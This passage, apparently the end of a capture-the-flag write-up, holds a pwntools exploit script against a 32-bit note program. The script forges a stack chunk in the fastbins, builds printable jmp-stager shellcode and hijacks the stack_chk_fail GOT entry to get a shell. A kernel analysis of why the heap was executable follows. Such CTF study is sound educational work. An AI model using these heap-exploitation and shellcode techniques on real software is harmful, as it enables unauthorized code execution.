    buf = pad_to_readint_buf(buf)
    p.send(buf)
    p.recvuntil(b'Index :')

    # free(*(target) == alloc_addr)
    index_buf = str(fake_alloc_addr_index - 2).encode() + b'\x00'
    index_buf = pad_to_readint_buf(index_buf)
    p.send(index_buf)
    p.recvuntil(b'Your choice :')

def gen_shellcode(start_addr):
    # Unfortunately, x86 doesn't supports "lea ebx, [eip + BIN_SH]". Moved the raw offset for it..
    offset_to_bin_sh = -40
    shellcode_asm = SHELLCODE.format(start_addr + offset_to_bin_sh)
    shellcode_bytes = asm(shellcode_asm)
    log.info(f'shellcode_asm: {shellcode_asm}\n bytes: {shellcode_bytes}\nlength: {len(asm(shellcode_asm))}')
    return shellcode_bytes

def gen_jmp_stager(chunk_size):
    '''
    Generates a short jmp stager shellcode. 
    Notice is_printable performs signed check on the shellcode bytes. Hence, we have to supply it with real printable characters..
    My idea is simple - for a short jmp, we only need to write 2 bytes. 
    Hence, this is a polymorphic shellcode that eventually writes the desired jmp bytes into the stack shellcode, 
    by utilizing 'push'. 
    We just increment the value of 'esp' to the desired target, using pop and popa. 
    Also notice that we assume that by the end of all pops, 'eax' contains the controlled value of '0x43434343', 
    which is a deterministic garbage we've left there previously.
    '''
    log.info(f'MIN: {minAllocSize(chunk_size)} MAX: {maxAllocSize(chunk_size)}')
    alloc_size = 0x10
    # Assertion that we would fall into the desired fastbin. 
    # Recall the '\x00' of strdup is also part of the allocation.
    assert(chunkSize(alloc_size + 1) == chunkSizeNoFlags(chunk_size))

    # popa, increment the stack by 0x20 for each instruction
    buf = b'\x61' * 3  
    # pop eax, increment the stack by 4 for each instruction
    buf += b'\x58' * 3  
    # sub eax, num operation - prepare for jump stager
    buf += b'\x2d'  
    # Overwrite to '\xeb' - jmp operand
    buf += b'\x58'  
    # offset of the backward jump
    buf += b'\x6e'  
    # just something legitimate which won't wrap around
    buf += b'\x41\x41'  
    # push eax - perform the write to the stack!
    buf += b'\x50'
    # Important - make sure it is sufficient size, 
    # such that the allocation would fall into the desired fastbins[]
    buf = buf.ljust(alloc_size, b'C')
    return buf

def overwrite_stack_chk_fail_to_shellcode(p, chunk_size, shellcode_bytes):
    '''
    Overwrites the GOT entry of stack_chk_fail, such that it would point to a stager shellcode on the stack,
    that eventually would execute 'shellcode_bytes'. 
    The allocation of the strdup'd chunk is based on chunk_size. We want it to use the fake chunk that resides within fastbins[0x18]
    '''
    # Write a shellcode that would only result with a short jmp to our real shellcode
    buf = gen_jmp_stager(chunk_size)
    # Write the actual shellcode
    buf += shellcode_bytes
    # Important - we overwrite the chunk to-be-allocated's size. 
    # We must not change its size, otherwise the allocation would trigger a crash.
    buf += p32(chunk_size)
    buf = buf.ljust(NAME_SIZE, b'C')

    # Trigger
    arbitrary_write_strdup_result(p, stack_chk_fail_got, buf, to_flush=False)
    log.info(f'Wrote: {buf}\ninto stack_chk_fail_got: {hex(stack_chk_fail_got)}')


def exploit(p):
    p.recvuntil(b'Your choice :')

    libc_base = leak_libc(p)
    log.info(f'libc_base: {hex(libc_base)}')

    env_0_addr = leak_stack(p, libc_base)
    log.info(f'env[0] addr: {hex(env_0_addr)}')

    # The main problem is that env[0] isn't a reliable stack address.
    # The first reason, is because the remote runs within a completely different environment. 
    # Hence, the env[] array differ, and remote offsets wouldn't match local. 
    # The second reason, and this is the most problematic aspect - 
    # There's a randomization of null bytes allocations between env[0] and envp itself.
    # This means that even local runs won't be able to use env[0] leak as a stack-base reference. 
    # We have to find a stack leak close enough to the main's frame. 
    # Therefore, I've chose to scan the stack from top-down, starting '&env[0]', until 'argv' address is found. 
    # This yields us a reliable stack address. 
    argv_addr = scan_stack(p, env_0_addr)
    log.info(f'argv addr: {hex(argv_addr)}')

    # Perform simple verification on the resolved address.
    # We simply sign that certain string pointer resides at some expected offset.
    assert_reliable_argv_addr(p, argv_addr)

    # Overwrite arena.system_mem. 
    # Since we're soon gonna free a chunk that resides on the stack into the fastbins, 
    # we have to pass the following check:
    # 1. ASSERT[aligned(fake_chunk)]
    # fake_next_chunk = fake_chunk + fake_chunk_size
    # 2. ASSERT[size(fake_next_chunk) > 8 && size (fake_next_chunk) < arena.system_mem]
    #
    # On 'del_note' stack frame, there are no adequate candidates for the fake_next_chunk size -
    # meaning, that they would be located within aligned addresses, as well as meeting the value constraints.
    # The trick is to increment the arena.system_mem size, such that the check would be nicer. 
    # By overwriting it to strdup's result, we write some heap address to 'arena.system_mem' (instead of default 0x21000).
    # By doing so, program addresses, having the values of '0x804AAAA' (which are always less than heap addresses),
    # would also become viable candidates as fake_next_chunk_sizes. 
    # In particular, there's only one such candidate - located at offset:
    # fake_next_chunk = fake_chunk + 0x18
    # 
    # Also notice, that because this is the first allocation, it also initializes the heap.
    # The heap initialization is crucial, in order to trigger allocator free() of the chunk. 
    # Otherwise, munmap would be called on the fake chunk - which would crash, as this isn't a page aligned address.
    overwrite_heap_system_mem(p, libc_base)

    # Write a fake chunk on the stack, using the read_int()'s local stack buffers.
    # Trigger free, such that the fake chunk would fall into fastbins[0x18].
    fake_stack_alloc_addr = argv_addr - 0xcc
    log.info(f'fake chunk addr: {hex(fake_stack_alloc_addr)}')
    # Put the target stack address within fastbins[0x18]
    chunk_size = 0x19
    free_fake_stack_alloc(p, fake_stack_alloc_addr, chunk_size)

    # Generate a shellcode, starting with b'\x00' such that 'is_printable' won't check its preceding bytes - due to 'strlen' usage.
    # Also, set nops at start, and jump trampoline at end, so I'll have easier life while targeting the shellcode.
    shellcode_bytes = gen_shellcode(fake_stack_alloc_addr)

    # Were having a stack address at fastbins[0x18]. 
    # Perform an adequate allocation, which would now be used by 'strdup', hence - returning our goal stack address (the fake chunk)!
    # The target address to which we write would be a GOT entry. 
    # That way, we can redirect control flow to the stack. 
    # 
    # VERY IMPORTANT NOTICE:
    # Initially I've tried overwriting 'strlen', 'puts' GOTs. None worked, due to a canary check detected.
    # Our chunk was a legitimate address within 'del_note' stack frame's. 
    # However, within 'add_note', it overlaps with the return address and stack canary.
    # Because 'strdup' writes printable bytes, it corrupts the canary. 
    # Unfortunately, I couldn't avoid it - on one hand, we must supply sufficient printable characters such that fastbins[0x18] would be used.
    # On the other hand, they overwrite the canary!
    # I also couldn't forge a chunk of size 8 bytes (min size, which wouldn't require any printable characters insertions), 
    # as there were no adequate fake_next_chunk candidates. 
    # This left me with one (funny) trick - overwrite 'stack_chk_fail' GOT!
    overwrite_stack_chk_fail_to_shellcode(p, chunk_size, shellcode_bytes)

    # Verify
    p.sendline(b'ls -la /home')
    

def main():
    if IS_DEBUG:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if IS_REMOTE:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

## Conclusion

Right after submitting the flag, I rushed to read some writeups - as I've knew my solution was way off the intended way. \
After I've read few writeups, I got one of the biggest facepalms I've ever had. Apparently, **THE HEAP WAS FREAKING EXECUTABLE**. \
This means that the intended solution was to only write some backward `jmp` instruction as polymorphic printable-only shellcode - which is a kindergarden pwnable skill. 

About 30 minutes after my rage, upon drinking some tea and cooling down abit, I had to research what have I done wrong with my assumption, led me thinking the remote heap isn't executable. \
I've started with a simple `checksec`, which had the following output:

```bash
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8047000)
    Stack:      Executable
    RWX:        Has RWX segments
```

As we can see, it clearly states that the stack is executable, there are RWX segments, and **`GNU_STACK` is missing**. By reading checksec's sources, within `nx.go` (yes, it is written with GO), I've found:

```go
func NX(name string, binary *elf.File) *nx {
	res := nx{}
	for _, p := range binary.Progs {
		if p.Type == elf.PT_GNU_STACK && p.Flags&elf.PF_X == 0 {
			res.Color = "green"
			res.Output = "NX enabled"
			return &res
		}
	}
```

This means it searches the binary's program headers for the `PT_GNU_STACK` flag, checking if it is enabled or not. \
My machine is an ubuntu-6.8. I've opened the kernel's sources, and looked for the `PT_GNU_STACK` symbol. It is only referenced from one interesting site - `fs/binfmt_elf.c`:

```c
for (i = 0; i < elf_ex->e_phnum; i++, elf_ppnt++)
		switch (elf_ppnt->p_type) {
		case PT_GNU_STACK:
			if (elf_ppnt->p_flags & PF_X)
				executable_stack = EXSTACK_ENABLE_X;
			else
				executable_stack = EXSTACK_DISABLE_X;
			break;
```

Which means that if this flag is on, the variable `executable_stack` is `true`. \
The remote machine runs on some old ubuntu-4.4. I've compared the uses of `executable_stack` on both versions, and they've seemed the same - both have served as an argument to `elf_read_implies_exec` and `setup_arg_pages` (may be irrelevant, has something to do with the interpreter loading). I've compared the implementation of these methods, on both kernels:

```c
// kernel 4.4
/*
 * An executable for which elf_read_implies_exec() returns TRUE will
 * have the READ_IMPLIES_EXEC personality flag set automatically.
 */
#define elf_read_implies_exec(ex, executable_stack)	\
	(executable_stack != EXSTACK_DISABLE_X)
    

// kernel 6.8
#define elf_read_implies_exec(ex, executable_stack)	\
	(mmap_is_ia32() && executable_stack == EXSTACK_DEFAULT)

/*
 * True on X86_32 or when emulating IA32 on X86_64
 */
static inline int mmap_is_ia32(void)
{
	return IS_ENABLED(CONFIG_X86_32) ||
	       (IS_ENABLED(CONFIG_COMPAT) &&
		test_thread_flag(TIF_ADDR32));
}
```

As mentioned by the comment, for enabling executable region, `elf_read_implies_exec` must be `true`. \
For older kernels, it solely depends on the `executable_stack`. But for modern kernels, it also checks that the kernel isn't 32 bit. This means that if the kernel is 64-bit, `PT_GNU_STACK` would only make the stack executable. Where for 32-bit kernels, it would make other segments, such as the heap, executable. 

I guess I've learned an important lesson here - it may be very worthy to understand if there are important implications regarding the different remote environment, not only by userland perspective - but also by kernelspace.  In particular, very old kernels compared to newer kernels may have dramatic changes. Hence, we might want to develop our exploit within some old ubuntu docker container, which would mimic the remote environment as close as possible. 
